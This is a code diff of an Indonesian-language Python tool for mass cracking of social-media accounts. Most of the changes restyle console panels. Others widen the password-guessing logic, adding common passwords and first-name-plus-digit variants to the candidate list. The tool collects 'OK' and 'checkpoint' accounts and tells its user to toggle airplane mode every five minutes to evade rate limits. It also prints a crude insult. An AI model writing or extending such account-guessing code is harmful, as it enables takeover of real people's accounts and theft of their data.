@@ -695,7 +695,7 @@ def setting():
         method.append('validate1')
     Console(width=80, style="bold cyan").print(Panel('''[bold white][[bold cyan]01[bold white]] [bold white]Password ke-1
 [bold white][[bold cyan]02[bold white]] [bold white]Password ke-2
-[bold white][[bold cyan]03[bold white]] [bold white]Password Manual [[bold red]Not Recommended[bold white]]''',subtitle="╭───", subtitle_align="left", title="[bold green]>[hot_pink2] (Crack Masal) [bold green]<"))
+[bold white][[bold cyan]03[bold white]] [bold white]Password Manual [[bold red]Not Recommended[bold white]]''',subtitle="╭───", subtitle_align="left", title="[bold green]>[hot yellow] (Password) [bold green]<"))
     pwplus=Console().input(f"[bold cyan]   ╰─> ")
     if pwplus in ['03','3']:
         pwpluss.append('ya')
@@ -705,7 +705,7 @@ def setting():
             pwnya.append(xpw)
     else:
         pwpluss.append('no')
-    Console(width=80, style="bold cyan").print(Panel(f'[bold yellow]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=80,title=f"[bold green]Setting Cek Apk"))
+    Console(width=80, style="bold cyan").print(Panel(f'[bold yellow]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',subtitle="╭───", subtitle_align="left",title=f"[bold green]Setting Cek Apk"))
     joki = Console().input(f"[bold cyan]   ╰─> ")
     if joki in ['']:
         print(' [+] Pilih Yang Bener Kontol ')
@@ -714,7 +714,7 @@ def setting():
         taplikasi.append('ya')
     else:
         taplikasi.append('no')
-    Console(width=80, style="bold cyan").print(Panel(f'[bold yellow]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',width=80,title=f"[bold green]Cek Opsi"))
+    Console(width=80, style="bold cyan").print(Panel(f'[bold yellow]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi"))
     joki = Console().input(f"[bold cyan]   ╰─> ")
     if joki in ['']:
         print(' [+] Pilih Yang Bener Kontol ')
@@ -723,7 +723,7 @@ def setting():
         gabriel.append('ya')
     else:
         gabriel.append('no')
-    Console(width=80, style="bold cyan").print(Panel(f'[bold yellow]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=80,title=f"[bold green]Setting User-Agent"))
+    Console(width=80, style="bold cyan").print(Panel(f'[bold yellow]Apakah Anda Ingin Mengunakan UA Manual Untuk Melakukan Crack Account ? Y/T',subtitle="╭───", subtitle_align="left",title=f"[bold green]Setting User-Agent"))
     uatambah = Console().input(f"[bold cyan]   ╰─> ")
     if uatambah in ['y','Ya','ya','Y']:
         ualuh.append('ya')
@@ -737,10 +737,10 @@ def passwrd():
 	global prog,des
 	print('')
 	urut = []
-	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=40,title=f"[bold green]OK SAVE",style=f"bold white"))
-	urut.append(panel(f'         [bold red]%s [bold white]'%(cpc),width=40,title=f"[bold red]CP SAVE",style=f"bold white"))
+	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=40,title=f"[bold green]OK SAVE",style=f"bold cyan"))
+	urut.append(panel(f'         [bold red]%s [bold white]'%(cpc),width=40,title=f"[bold red]CP SAVE",style=f"bold cyan"))
 	wa.print(Columns(urut))
-	Console(width=80, style="bold cyan").print(Panel(f'\t[bold yellow]On/Off Mode Pesawat Setiap 5 menit',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
+	Console(width=80, style="bold cyan").print(Panel(f'\t[bold yellow]hidup/matikan Mode Pesawat Setiap 5 menit',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
@@ -748,7 +748,7 @@ def passwrd():
 			for yuzong in id2:
 				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 				frs = nmf.split(" ")[0]
-				pwv = ['sayang','sayangku','sayang123','bismillah','katasandi','sandi123','malang','bismillah123','123455']
+				pwv = ['anjing','tegalgading','sayang','sayangku','sayang123','bismillah','katasandi','sandi123','malang','bismillah123','123455']
 				if len(nmf)<6:
 					if len(frs)<3:
 						pass
@@ -780,6 +780,9 @@ def passwrd():
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
+						pwv.append(frs+'1234567')
+						pwv.append(frs+'12345678')
+						pwv.append(frs+'123456789')
 				if 'ya' in pwpluss: 
 					for xpwd in pwnya:
 						pwv.append(xpwd)
